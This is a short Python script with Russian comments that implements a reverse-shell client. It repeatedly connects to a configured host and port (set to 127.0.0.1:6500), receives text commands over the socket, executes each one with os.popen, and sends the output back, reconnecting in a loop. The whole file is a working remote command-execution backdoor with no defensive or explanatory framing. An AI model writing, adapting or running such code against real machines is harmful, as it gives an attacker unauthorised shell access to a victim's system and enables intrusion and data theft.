import socket
import os

def ExecuteCommand(command):
        output = os.popen(command).read()
        return output

def main():
        host = "127.0.0.1" # ip который будем использовать
        port = 6500 # порт
        while True:
            while True:
                try:
                    s = socket.socket() # создаем сокет
                    s.connect((host,port))  # подключаемся
                except:
                    break
    
                while True:
                    try:
                        data = s.recv(1024).decode() # получаем команду
                        output = ExecuteCommand(str(data))
                        if len(output) == 0:
                            s.send(" ".encode()) # в случае, если рзультат
                            # пустой, отправляем пробел
                        else:
                            s.send(output.encode()) # отправляем результат
                    except:
                        break
        s.close()

if __name__ == '__main__':
    main()